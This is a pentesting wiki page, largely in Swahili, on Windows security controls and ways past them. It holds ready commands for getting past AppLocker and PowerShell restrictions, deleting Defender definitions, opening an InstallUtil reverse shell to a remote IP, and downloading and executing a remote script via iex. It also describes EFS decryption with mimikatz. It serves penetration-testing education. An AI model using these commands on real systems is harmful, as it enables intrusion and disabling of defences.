# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

Application whitelist ni orodha ya software applications au executables zilizoidhinishwa ambazo zinaruhusiwa kuwepo na kuendeshwa kwenye mfumo. Lengo ni kulinda mazingira dhidi ya malware hatari na software ambayo haijaidhinishwa na isiyolingana na mahitaji mahususi ya biashara ya organization.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **application whitelisting solution** ya Microsoft na huwapa system administrators udhibiti wa **applications na files ambazo users wanaweza kuendesha**. Hutoa **udhibiti wa kina** juu ya executables, scripts, Windows installer files, DLLs, packaged apps, na packed app installers.\
Ni kawaida kwa organizations **kuzuia cmd.exe na PowerShell.exe** pamoja na write access kwenye directories fulani, **lakini haya yote yanaweza kubypass**.

### Kagua

Kagua ni files/extensions zipi zimewekwa kwenye blacklist/whitelist:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
`Test-AppLockerPolicy` hutathmini faili zinazolengwa kwa utambulisho mahususi dhidi ya policy ya AppLocker. Jaribu akaunti ambayo token yake itatekeleza payload kwa sababu rules zinaweza kulenga users au groups; `Get-AppLockerFileInformation` pia ni muhimu kukagua path, hash, na metadata ya publisher ambayo rules zinaweza ku-match.<sup>[[5]](#references)</sup>
```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```
Njia hii ya usajili ina mipangilio na sera zinazotumiwa na AppLocker, na inatoa njia ya kukagua seti ya sasa ya sheria zinazotekelezwa kwenye mfumo:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Writable folders** muhimu za kufanya Bypass ya AppLocker Policy: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows`, kuna **Writable folders** unazoweza kutumia kufanya **bypass** hii.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Binari za [**"LOLBAS's"**](https://lolbas-project.github.io/) **zinazoaminika** pia zinaweza kuwa muhimu katika kupita AppLocker.
- **Rules zilizoandikwa vibaya pia zinaweza kupitwa**
- Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folder yenye jina `allowed`** mahali popote na itaruhusiwa.
- Mashirika pia mara nyingi hulenga **kuzuia executable ya `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, lakini husahau kuhusu [**maeneo mengine ya executable za PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kama `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
- **Utekelezaji wa DLL huwashwa mara chache sana** kwa sababu ya mzigo wa ziada unaoweza kuweka kwenye mfumo, pamoja na kiasi cha testing kinachohitajika kuhakikisha hakuna kitu kitakachoharibika. Kwa hiyo kutumia **DLL kama backdoors kutasaidia kupita AppLocker**.
- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza** code ya **Powershell** katika process yoyote na kupita AppLocker. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Uhifadhi wa Credentials

### Security Accounts Manager (SAM)

Credentials za ndani zinapatikana katika faili hili, na passwords zime-hash.

### Local Security Authority (LSA) - LSASS

**Credentials** (zilizo-hash) **huhifadhiwa** katika **memory** ya subsystem hii kwa sababu za Single Sign-On.\
**LSA** husimamia **security policy** ya ndani (password policy, permissions za users...), **authentication**, **access tokens**...\
LSA ndiyo **itakayokagua** credentials zilizotolewa ndani ya faili la **SAM** (kwa local login) na **kuwasiliana** na **domain controller** ili ku-authenticate domain user.

**Credentials** **huhifadhiwa** ndani ya **process ya LSASS**: tickets za Kerberos, hashes za NT na LM, na passwords zinazoweza kufichuliwa kwa urahisi.

### LSA secrets

LSA inaweza kuhifadhi baadhi ya credentials kwenye disk:

- Password ya computer account ya Active Directory (domain controller isiyofikika).
- Passwords za accounts za Windows services
- Passwords za scheduled tasks
- Mengine (password ya IIS applications...)

### NTDS.dit

Hii ni database ya Active Directory. Inapatikana tu katika Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana katika Windows 10 na Windows 11, pamoja na matoleo ya Windows Server. **Huzuia** pentesting tools za kawaida kama **`WinPEAS`**. Hata hivyo, kuna njia za **kupita protections hizi**.

### Ukaguzi

Ili kukagua **hali** ya **Defender**, unaweza kutekeleza PS cmdlet **`Get-MpComputerStatus`** (kagua thamani ya **`RealTimeProtectionEnabled`** ili kujua ikiwa imewashwa):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ili ku-enumerate, unaweza pia kuendesha:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS hulinda files kupitia encryption, kwa kutumia **symmetric key** inayojulikana kama **File Encryption Key (FEK)**. Key hii hu-encryptiwa kwa **public key** ya mtumiaji na kuhifadhiwa ndani ya **alternative data stream** ya $EFS ya file lililo-encryptiwa. Decryption inapohitajika, **private key** inayolingana ya digital certificate ya mtumiaji hutumiwa ku-decrypt FEK kutoka kwenye stream ya $EFS. Maelezo zaidi yanaweza kupatikana [hapa](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Decryption scenarios bila user initiation** ni pamoja na:

- Files au folders zinapohamishwa kwenye file system isiyo ya EFS, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), hu-decryptiwa automatically.
- Encrypted files zinapotumwa kupitia network kwa kutumia SMB/CIFS protocol, hu-decryptiwa kabla ya transmission.

Njia hii ya encryption huruhusu **transparent access** ya owner kwenye encrypted files. Hata hivyo, kubadilisha tu password ya owner na ku-login hakutaruhusu decryption.

**Mambo Muhimu**:

- EFS hutumia symmetric FEK, iliyo-encryptiwa kwa public key ya mtumiaji.
- Decryption hutumia private key ya mtumiaji kupata FEK.
- Automatic decryption hutokea chini ya conditions maalum, kama kunakili kwenye FAT32 au network transmission.
- Encrypted files zinaweza kufikiwa na owner bila hatua za ziada.

### Kagua taarifa za EFS

Kagua ikiwa **user** **ametumia** **service** hii kwa kuangalia ikiwa path hii ipo:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kagua **nani** ana **access** kwenye file kwa kutumia cipher /c \<file>\
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folder ili **ku-encrypt** na **ku-decrypt** files zote

### Ku-decrypt files za EFS

#### Kuwa Authority System

Njia hii inahitaji **victim user** awe **akiendesha** **process** kwenye host. Ikiwa hivyo, kutoka kwenye `meterpreter` session unaweza ku-impersonate process token ya user (`impersonate_token` kutoka `incognito`). Vinginevyo, unaweza ku-`migrate` kwenye process ya user.

#### Kujua Password ya User

Mimikatz inaweza ku-import certificate na private key ya user, kisha kuzitumia ku-decrypt files zinazolindwa na EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa service accounts katika IT infrastructures. Tofauti na service accounts za kawaida ambazo mara nyingi huwa na setting ya "**Password never expire**", gMSAs hutoa solution iliyo salama na rahisi zaidi kusimamia:

- **Automatic Password Management**: gMSAs hutumia password changamano yenye characters 240, ambayo hubadilika automatically kulingana na domain au computer policy. Mchakato huu hushughulikiwa na Microsoft's Key Distribution Service (KDC), hivyo kuondoa hitaji la password updates za manual.
- **Enhanced Security**: Accounts hizi haziathiriwi na lockouts na haziwezi kutumiwa kwa interactive logins, hivyo kuimarisha security yake.
- **Multiple Host Support**: gMSAs zinaweza kushirikiwa kati ya hosts nyingi, hivyo kuzifanya zifae kwa services zinazoendesha kwenye servers nyingi.
- **Scheduled Task Capability**: Tofauti na managed service accounts, gMSAs zinaunga mkono uendeshaji wa scheduled tasks.
- **Simplified SPN Management**: System hu-update Service Principal Name (SPN) automatically kunapokuwa na mabadiliko kwenye sAMaccount details au DNS name ya computer, hivyo kurahisisha SPN management.

Passwords za gMSAs huhifadhiwa kwenye LDAP property _**msDS-ManagedPassword**_ na hu-resetiwa automatically kila baada ya siku 30 na Domain Controllers (DCs). Password hii, ambayo ni encrypted data blob inayojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), inaweza kuretrieviwa tu na administrators walio-authorizewa na servers ambazo gMSAs zime-installiwa, hivyo kuhakikisha environment salama. Ili kufikia taarifa hii, secured connection kama LDAPS inahitajika, au connection lazima iwe authenticated kwa 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Unaweza kusoma password hii kwa [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pata maelezo zaidi katika chapisho hili**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Pia, angalia [ukurasa huu wa wavuti](https://cube0x0.github.io/Relaying-for-gMSA/) kuhusu jinsi ya kutekeleza **NTLM relay attack** ili **kusoma** **password** ya **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Tofautisha **legacy Microsoft LAPS** na utekelezaji asilia wa **Windows LAPS** wakati wa enumeration. Windows LAPS ilitolewa katika masasisho ya Windows ya Aprili 11, 2023, na inaweza kuhifadhi password ya administrator wa ndani inayodhibitiwa kwenye **Windows Server Active Directory** au **Microsoft Entra ID**. Katika deployments zinazotegemea AD, inaweza pia kusimba passwords kwa njia fiche, kuhifadhi historia ya passwords zilizosimbwa, na kudhibiti password ya DSRM ya domain controller. Legacy MSI inayoweza kupakuliwa imeacha kutumika kwenye matoleo mapya ya Windows, ingawa Windows LAPS inaweza kufanya kazi katika legacy-emulation mode.<sup>[[6]](#references)</sup>

Kwa sababu **legacy Microsoft LAPS** na **Windows LAPS** ni implementations tofauti, tambua ni ipi iliyotumika kabla ya kutumia mashambulizi yanayolenga attributes au cmdlets maalum. Ukurasa uliounganishwa unashughulikia discovery, ACL enumeration, retrieval, expiration manipulation, na offline recovery bila kurudia taratibu hizo hapa.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **huzuia kwa ukali vipengele vingi** vinavyohitajika kutumia PowerShell kwa ufanisi, kama vile kuzuia COM objects, kuruhusu tu .NET types zilizoidhinishwa, workflows zinazotegemea XAML, PowerShell classes, na vinginevyo.

### **Angalia**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Katika Windows za sasa, Bypass hiyo haitafanya kazi, lakini unaweza kutumia[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili ku-compile unaweza kuhitaji** **ku** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> kuongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **kubadilisha project kuwa** .Net4.5.

#### Bypass ya moja kwa moja:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **execute Powershell** code katika process yoyote na kubypass constrained mode. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Sera ya Utekelezaji ya PS

Kwa chaguo-msingi imewekwa kuwa **restricted.** Njia kuu za kubypass sera hii ni:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Mengi yanaweza kupatikana [hapa](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Kiolesura cha Mtoa Huduma wa Usalama (SSPI)

Ni API inayoweza kutumiwa kuthibitisha watumiaji.

SSPI itawajibika kutafuta protocol inayofaa kwa mashine mbili zinazotaka kuwasiliana. Njia inayopendelewa kwa hili ni Kerberos. Kisha SSPI itajadili ni authentication protocol ipi itakayotumiwa; authentication protocols hizi huitwa Security Support Provider (SSP), zinapatikana ndani ya kila mashine ya Windows katika mfumo wa DLL, na mashine zote mbili lazima ziunge mkono protocol hiyo hiyo ili ziweze kuwasiliana.

### SSP kuu

- **Kerberos**: Inayopendelewa
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** na **NTLMv2**: Kwa sababu za compatibility
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers na LDAP, password katika mfumo wa MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL na TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Hutumiwa kujadili protocol itakayotumika (Kerberos au NTLM, ambapo Kerberos ndiyo default)
- %windir%\Windows\System32\lsasrv.dll

#### Majadiliano yanaweza kutoa methods kadhaa au moja tu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni feature inayowezesha **consent prompt kwa shughuli zilizoinuliwa**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [Kupita AppLocker na PowerShell constrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [jinsi ya ~ kusimbua files za EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying kwa gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [Njia 15 za Kupita PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Tumia cmdlets za Windows PowerShell za AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Muhtasari wa Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
